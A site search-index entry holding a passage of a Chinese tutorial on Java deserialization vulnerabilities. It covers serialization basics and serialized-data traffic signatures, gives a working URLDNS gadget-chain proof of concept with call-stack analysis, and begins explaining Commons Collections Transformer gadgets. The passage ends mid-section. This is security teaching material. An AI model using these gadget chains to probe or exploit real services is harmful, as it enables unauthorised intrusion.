<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Java 反序列化</title>
    <url>/2024/11/08/java-serialization/</url>
    <content><![CDATA[<h1 id="反序列化基础"><a href="#反序列化基础" class="headerlink" title="反序列化基础"></a>反序列化基础</h1><p>Java 的序列化（Serialization）和反序列化（Deserialization）是将对象的状态转换为字节流并恢复的过程。这个过程使对象可以保存到文件、通过网络传输或保存到数据库中，并在稍后恢复成对象。</p>
<ul>
<li><strong>序列化（Serialization）</strong>：将 Java 对象的状态转换为字节流的过程。这使得对象可以保存到文件、发送到其他 JVM 甚至通过网络传输。</li>
<li><strong>反序列化（Deserialization）</strong>：将字节流转换回 Java 对象的过程。这允许恢复先前序列化的对象状态。</li>
</ul>
<h2 id="序列化条件"><a href="#序列化条件" class="headerlink" title="序列化条件"></a>序列化条件</h2><p>要使 Java 对象可序列化，类必须实现 <code>java.io.Serializable</code> 接口。<strong>这个接口是一个标记接口（没有方法），它表明该类的对象可以被序列化</strong>。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>; <span class="comment">// 用于版本控制</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Constructors, getters, and setters</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong>serialVersionUID</strong>：每个可序列化类建议定义一个 <code>serialVersionUID</code> 字段，用于版本控制。不同的 <code>serialVersionUID</code> 表示类的不同版本，如果序列化和反序列化的版本不匹配会抛出 <code>InvalidClassException</code>。<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br></pre></td></tr></table></figure></div></li>
<li><strong>transient 关键字</strong>：声明为 <code>transient</code> 的字段不会被序列化。它用于避免序列化敏感信息或不需要保存的字段。这种字段反序列化后为默认值（如 <code>null</code>）。<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> String password; <span class="comment">// 密码不会被序列化</span></span><br></pre></td></tr></table></figure></div></li>
<li><strong>静态字段</strong>：静态字段属于类，而不是实例，因此不会被序列化。</li>
<li><strong>对象图的完整性</strong>：序列化对象时，会递归地序列化其引用的所有对象。因此，引用对象也必须是可序列化的，否则会抛出 <code>NotSerializableException</code>。</li>
</ul>
<h2 id="序列化接口"><a href="#序列化接口" class="headerlink" title="序列化接口"></a>序列化接口</h2><h3 id="序列化基本用法"><a href="#序列化基本用法" class="headerlink" title="序列化基本用法"></a>序列化基本用法</h3><ul>
<li><strong>序列化对象</strong>：使用 <code>ObjectOutputStream</code> 将对象写入（<code>writeObject</code> 方法）到输出流（如文件输出流）。  <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">objectOutputStream.writeObject(hashMap);</span><br></pre></td></tr></table></figure></div></li>
<li><strong>反序列化对象</strong>：使用 <code>ObjectInputStream</code> 从输入流（如文件输入流）读取（<code>readObject</code> 方法）对象。  <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">hashMap = (HashMap)objectInputStream.readObject();</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="自定义序列化"><a href="#自定义序列化" class="headerlink" title="自定义序列化"></a>自定义序列化</h3><ul>
<li><p><strong>自定义序列化</strong>：通过实现 <code>writeObject</code> 和 <code>readObject</code> 方法，可以自定义序列化和反序列化的行为。<strong>通常精心构造的序列化对象和 readObject 的自定义操作结合就可以造成反序列化漏洞。</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    out.defaultWriteObject(); <span class="comment">// 默认序列化</span></span><br><span class="line">    <span class="comment">// 额外的序列化逻辑</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    in.defaultReadObject(); <span class="comment">// 默认反序列化</span></span><br><span class="line">    <span class="comment">// 额外的反序列化逻辑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>Externalizable 接口</strong>：<code>Externalizable</code> 是 <code>Serializable</code> 的子接口，它强制实现 <code>writeExternal</code> 和 <code>readExternal</code> 方法，提供完全控制序列化过程的能力。这对性能优化或定制序列化格式非常有用。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Externalizable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Externalizable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 必须有无参数构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        out.writeObject(name);</span><br><span class="line">        out.writeInt(age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        name = (String) in.readObject();</span><br><span class="line">        age = in.readInt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h2 id="反序列化功能特征"><a href="#反序列化功能特征" class="headerlink" title="反序列化功能特征"></a>反序列化功能特征</h2><h3 id="压缩特征（压缩后一些数据格式改变）"><a href="#压缩特征（压缩后一些数据格式改变）" class="headerlink" title="压缩特征（压缩后一些数据格式改变）"></a>压缩特征（压缩后一些数据格式改变）</h3><ul>
<li>zip 格式特征：<code>PK*</code></li>
<li>zip+base64：<code>UE*</code></li>
<li>gzip+base64：<code>H4s*</code></li>
</ul>
<h3 id="反序列化数据特征-数据内容-请求类型"><a href="#反序列化数据特征-数据内容-请求类型" class="headerlink" title="反序列化数据特征(数据内容+请求类型)"></a>反序列化数据特征(数据内容+请求类型)</h3><ul>
<li><code>AC ED 00 05</code> in Hex</li>
<li><code>rO0</code> in Base64</li>
<li><code>Content-type = ‘application/x-java-serialized-object</code></li>
</ul>
<h2 id="反序列化利用（URLDNS-为例）"><a href="#反序列化利用（URLDNS-为例）" class="headerlink" title="反序列化利用（URLDNS 为例）"></a>反序列化利用（URLDNS 为例）</h2><p>URLDNS 反序列化利用链可以通过 DNS 请求来验证反序列化漏洞的可利用性。这条利用链使用 Java 内置的类构造，对第三方库没有依赖，可以在没有回显的情况下验证是否存在反序列化漏洞。我们可以在 <a class="link"   href="https://requestrepo.com/" >https://requestrepo.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 网站上进行 DNS 请求测试。</p>
<h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, <span class="string">&quot;http://www.example.com&quot;</span>, <span class="keyword">new</span> <span class="title class_">URLStreamHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(url, <span class="string">&quot;hashCode&quot;</span>, <span class="number">0xdeadbeef</span>); <span class="comment">// 防止提前触发影响观察现象</span></span><br><span class="line">        hashMap.put(url, <span class="string">&quot;sky123&quot;</span>);</span><br><span class="line">        setFieldValue(url, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object object, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>调用栈如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">getHostAddress:436, URLStreamHandler (java.net)</span><br><span class="line">hashCode:353, URLStreamHandler (java.net)</span><br><span class="line">hashCode:878, URL (java.net)</span><br><span class="line">hash:338, HashMap (java.util)</span><br><span class="line">readObject:1397, HashMap (java.util)</span><br></pre></td></tr></table></figure></div>
<p>首先在 <code>HashMap.readObject</code> 中会遍历 <code>HashMap</code> 的成员并对 <code>key</code> 调用 <code>HashMap.hash</code> 函数计算 hash。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                         mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">    	...</span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);	<span class="comment">//	&lt;-- 调用 hash 函数</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>HashMap.hash</code> 函数中会调用 <code>key</code> 的 <code>hashCode</code> 方法，也就是 <code>URL.hashCode</code>。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在 <code>URL.hashCode</code> 函数中，由于我们设置 <code>url</code> 对象的 <code>hashCode</code> 成员值为 -1，因此会调用 <code>URLStreamHandler.hashCode</code> 函数。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>URLStreamHandler.hashCode</code> 函数会调用 <code>getHostAddress</code> 函数获取 URL 对应的  ip 地址，也就会发送 DNS 请求。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="CommonCollections-系列"><a href="#CommonCollections-系列" class="headerlink" title="CommonCollections 系列"></a>CommonCollections 系列</h1><h2 id="Commons-Collections-概述"><a href="#Commons-Collections-概述" class="headerlink" title="Commons Collections 概述"></a>Commons Collections 概述</h2><p>Apache Commons Collections 是⼀个著名的辅助开发库，包含了一些 Java 中没有的数据结构和和辅助方法，不过随着 Java 9 以后的版本中原生库功能的丰富，以及反序列化漏洞的影响，它也在逐渐被升级或替代。</p>
<p>在 2015 年底 commons-collections 反序列化利用链被提出时，Apache Commons Collections 有以下两个分支版本：</p>
<ul>
<li><code>commons-collections:commons-collections</code></li>
<li><code>org.apache.commons:commons-collections4</code></li>
</ul>
<p>前者是 Commons Collections 老的版本包，当时版本号是 3.2.1；后者是官方在 2013 年推出的 4 版本，当时版本号是 4.0。</p>
<p>因为官方认为旧的 commons-collections 有⼀些架构和 API 设计上的问题，但修复这些问题，会产生大量不能向前兼容的改动。所以，commons-collections4 不再认为是一个用来替换 commons-collections 的新版本，而是一个新的包，两者的命名空间不冲突，因此可以共存在同一个项目中。</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons/collections --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons/collections4 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p><code>Transformer</code> 是一个接口，具体代码如下，可以看到这个接口只有一个 <code>transform</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    Object <span class="title function_">transform</span><span class="params">(Object var1)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>Transformer</code> 可以说是 CC 链的核心，<del>几乎</del>所有的 CC 链都依赖于 <code>Transformer</code>。我们可以简单的把 CC 链总结为：</p>
<ul>
<li>先寻找一个类，这个类自定义的 <code>readObject</code> 方法会直接或间接的触发<strong>对指定 <code>Transformer</code> 对象调用 <code>transform</code> 方法</strong>的代码。</li>
<li>由于我们可以用一系列 <code>Transformer</code> 接口实现类实现代码执行流的完全控制，因此当调用 <code>transform</code> 方法的时候，就可以执行我们的恶意代码。</li>
</ul>
<h3 id="调用-transform-方法的对象"><a href="#调用-transform-方法的对象" class="headerlink" title="调用 transform 方法的对象"></a>调用 transform 方法的对象</h3><h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><p><code>TransformedMap</code> 用于对 Java 标准数据结构 Map 做一个修饰，被修饰过的 <code>Map</code> 在添加（写入操作）新的元素时，将可以执行一个回调。我们通过下面这行代码对 <code>innerMap</code> 进行修饰，传出的 <code>outerMap</code> 即是修饰后的 <code>Map</code>：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, keyTransformer,</span><br><span class="line">valueTransformer);</span><br></pre></td></tr></table></figure></div>
<p>被修饰后的 <code>outerMap</code> 在转换 <code>Map</code> 的新元素时，就会调用 <code>transform</code> 方法，这个过程就类似在调用⼀个“回调函数”，这个回调的参数是原始对象。</p>
<p>例如 <code>TransformedMap.put</code> 方法：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">    key = <span class="built_in">this</span>.transformKey(key);</span><br><span class="line">    value = <span class="built_in">this</span>.transformValue(value);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.getMap().put(key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>另外对 <code>TransformedMap</code> 内部成员调用 <code>setValue</code> 时也会调用 <code>transform</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    value = parent.checkSetValue(value);</span><br><span class="line">    <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h4><p><code>LazyMap</code> 和 <code>TransformedMap</code> 类似，都来自于 Common-Collections 库，并继承 <code>AbstractMapDecorator</code>。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br></pre></td></tr></table></figure></div>
<p>在 Common-Collections4 中 <code>decorate</code> 方法改为 <code>lazyMap</code>：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.lazyMap(innerMap, transformerChain)</span><br></pre></td></tr></table></figure></div>
<p><code>LazyMap</code> 的漏洞触发点和 <code>TransformedMap</code> 唯一的差别是，<code>TransformedMap</code> 是在写入元素的时候执行 <code>transform</code>，而 <code>LazyMap</code> 是在其 <code>get</code> 方法中执行的 <code>factory.transform</code>。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>注意  <code>LazyMap</code> 是在其 <code>get</code> 方法中执行的 <code>factory.transform</code> 的条件是 <code>LazyMap</code> 没有当前查询的 <code>key</code>，也就是说对于一个特定的 <code>key</code>，我们只能调用一次 <code>transform</code> 。除非调用 <code>Map.clear</code> 方法清空 <code>LazyMap</code> 。</p>
<h4 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h4><p><code>TransformingComparator</code> 实现了 <code>java.util.Comparator</code> 接口，这个接口用于定义两个对象如何进行比较。对于一些需要维护顺序的数据结构（如 <code>java.util.PriorityQueue</code>），如果传入 <code>TransformingComparator</code> 用于两个对象的比较，那么比较两个对象的时候会调用 <code>TransformingComparator</code> 的 <code>compare</code> 方法。在 <code>compare</code> 方法内部会调用其中 <code>transformer</code> 成员的 <code>transform</code> 方法并传入进行比较的对象。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object obj1, Object obj2)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>TransformingComparator</code> 的构造函数如下，这里的 <code>transformer</code> 就是我们构造的 <code>Transformer</code> 结构，另外 <code>decorated</code> 如果不指定会传入 <code>new ComparableComparator()</code> 。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer transformer)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(transformer, <span class="keyword">new</span> <span class="title class_">ComparableComparator</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer transformer, Comparator decorated)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.decorated = decorated;</span><br><span class="line">    <span class="built_in">this</span>.transformer = transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="Transformer-的接口实现类"><a href="#Transformer-的接口实现类" class="headerlink" title="Transformer 的接口实现类"></a>Transformer 的接口实现类</h3><h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p><code>ConstantTransformer</code> 在构造函数的时候传入一个对象，并在 <code>transform</code> 方法将这个对象再返回：</p>
